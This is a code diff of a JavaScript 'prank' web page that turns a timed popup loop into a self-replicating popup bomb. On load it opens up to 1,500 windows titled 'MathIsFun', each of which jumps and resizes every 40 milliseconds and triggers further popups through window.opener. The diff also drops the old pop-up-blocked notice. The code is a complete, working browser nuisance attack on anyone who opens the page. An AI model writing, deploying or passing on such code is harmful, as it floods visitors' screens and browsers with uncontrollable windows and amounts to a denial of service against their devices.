@@ -10,107 +10,100 @@
 const TOTAL_WINDOWS = 1500;
 let opened = 0;
 
-function startPrank() {
+function openPopup() {
 
-    function openNext() {
+    if (opened >= TOTAL_WINDOWS) return;
 
-        if (opened >= TOTAL_WINDOWS) return;
+    const width = 300;
+    const height = 200;
 
-        const width = 300;
-        const height = 200;
+    const left =
+        Math.random() * Math.max(1, screen.availWidth - width);
 
-        const left = Math.random() * Math.max(1, screen.availWidth - width);
-        const top = Math.random() * Math.max(1, screen.availHeight - height);
+    const top =
+        Math.random() * Math.max(1, screen.availHeight - height);
 
-        const popup = window.open(
-            "",
-            "_blank",
-            `width=${width},height=${height},left=${left},top=${top}`
-        );
+    const popup = window.open(
+        "",
+        "_blank",
+        `width=${width},height=${height},left=${left},top=${top}`
+    );
 
-        if (!popup) {
-            document.body.innerHTML = `
-                <h1>Pop-ups are blocked</h1>
-                <p>Allow pop-ups for this website and reload the page.</p>
-            `;
-            return;
-        }
+    if (!popup) return;
 
-        const number = opened + 1;
+    opened++;
 
-        popup.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <title>MathIsFun ${number}</title>
-            </head>
+    const number = opened;
 
-            <body style="
-                margin:0;
-                overflow:hidden;
-                background:#${Math.floor(
-                    Math.random() * 16777215
-                ).toString(16).padStart(6, "0")};
-                color:white;
-                font-family:Arial;
-                text-align:center;
-            ">
+    popup.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>MathIsFun ${number}</title>
+        </head>
 
-                <h1>MathIsFun ${number}</h1>
+        <body style="
+            margin:0;
+            overflow:hidden;
+            background:#${Math.floor(
+                Math.random() * 16777215
+            ).toString(16).padStart(6, "0")};
+            color:white;
+            font-family:Arial;
+            text-align:center;
+        ">
 
-                <script>
-                    function chaos() {
-                        try {
+            <h1>MathIsFun ${number}</h1>
 
-                            const newWidth =
-                                Math.floor(Math.random() * 500) + 100;
+            <script>
 
-                            const newHeight =
-                                Math.floor(Math.random() * 400) + 80;
+                // Rapid movement and resizing
+                setInterval(() => {
+                    try {
 
-                            const maxX =
-                                Math.max(0, screen.availWidth - newWidth);
+                        const newWidth =
+                            Math.floor(Math.random() * 500) + 100;
 
-                            const maxY =
-                                Math.max(0, screen.availHeight - newHeight);
+                        const newHeight =
+                            Math.floor(Math.random() * 400) + 80;
 
-                            const newX =
-                                Math.random() * maxX;
+                        const x =
+                            Math.random() *
+                            Math.max(1, screen.availWidth - newWidth);
 
-                            const newY =
-                                Math.random() * maxY;
+                        const y =
+                            Math.random() *
+                            Math.max(1, screen.availHeight - newHeight);
 
-                            window.moveTo(newX, newY);
+                        window.moveTo(x, y);
+                        window.resizeTo(newWidth, newHeight);
 
-                            window.resizeTo(
-                                newWidth,
-                                newHeight
-                            );
+                    } catch (e) {}
+                }, 40);
 
-                        } catch (error) {
-                            // Browser may restrict movement/resizing.
-                        }
-                    }
+                // Replicate
+                setTimeout(() => {
 
-                    setInterval(chaos, 40);
-                <\/script>
+                    try {
+                        window.opener.openPopup();
+                    } catch (e) {}
 
-            </body>
-            </html>
-        `);
+                }, 100);
 
-        popup.document.close();
+            <\/script>
 
-        opened++;
+        </body>
+        </html>
+    `);
 
-        // Rapid popup creation
-        setTimeout(openNext, 75);
-    }
-
-    openNext();
+    popup.document.close();
 }
 
-window.addEventListener("load", startPrank);
+// Start the first popup
+window.addEventListener("load", () => {
+    openPopup();
+});
+
 </script>
 
 </body>
